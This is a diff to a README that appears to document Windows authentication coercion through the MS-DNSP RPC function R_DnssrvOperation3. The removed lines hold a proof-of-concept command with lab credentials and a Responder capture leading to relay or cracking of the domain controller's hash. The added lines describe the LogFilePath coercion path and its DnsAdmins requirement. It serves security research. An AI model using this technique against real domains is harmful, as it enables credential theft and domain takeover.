@@ -21,26 +21,9 @@
 
 In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine, usually on SMB. Then we need to connect to the remote SMB pipe `\PIPE\DNSSERVER` and bind to the desired [`MS-DNSP`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/f97756c9-3783-428b-9451-b376f877319a) protocol (with uuid `50abc2a4-574d-40b3-9d66-ee4fd5fba076` and version `0.0`) in order to perform remote procedure calls to functions in the [`MS-DNSP`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/f97756c9-3783-428b-9451-b376f877319a) protocol.
 
-The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named `\PIPE\DNSSERVER` This pipe is connected to the protocol [[MS-DNSP]: Domain Name Service (DNS) Server Management Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/f97756c9-3783-428b-9451-b376f877319a) and allows to call RPC functions of this protocol. We will then call the remote [`R_DnssrvOperation3`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/54044c36-4e9e-44fb-80df-ffb026939b8b) function on the remote Windows Server (192.168.2.1) with the following parameters:
+This method is a versioned variant of [`R_DnssrvOperation` (opnum 0)](../00.%20Remote%20call%20to%20R_DnssrvOperation%20(opnum%200)/README.md), adding client-version / settings-flag parameters. It dispatches the same `pszOperation` set, so the **`LogFilePath` coercion is expected to work through this call as well**.
 
-```cpp
-R_DnssrvOperation3('192.168.2.51\x00')
-```
-
-We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):
-
-```bash
-./coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" 192.168.2.51 192.168.2.1
-```
-
-![](./imgs/poc.png)
-
-This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\share` and therefore authenticate using its machine account (`DC01$`).  After this RPC call, we get an authentication from the domain controller with its machine account directly on Responder:
-
-![](./imgs/hash.png)
-
-After this step, we relay the authentication to other services in order to elevate our privileges, or try to downgrade it to NTLMv1 and crack it in order to get the NT hash of the domain controller's machine account. This kind of vulnerabilities allows to quickly get from user to domain administrator in unprotected domains!
-
+`LogFilePath` was confirmed as a working coercion via `R_DnssrvOperation` (opnum 0) on **Windows Server 2025**: setting `pszOperation="LogFilePath"`, `dwTypeId=DNSSRV_TYPEID_LPWSTR`, `pData.WideString = \<listener>\share\x` makes the DNS server (the machine account) authenticate to the listener immediately, no restart. It requires DnsAdmins (write on the DNS Server Configuration ACL). Only opnum 0 was exercised in testing; see that folder's README for the full method and evidence. The `ZoneExport` operation is **not** a vector (the server confines the export filename to a bare name in the DNS directory).
 
 ## Function technical detail
 
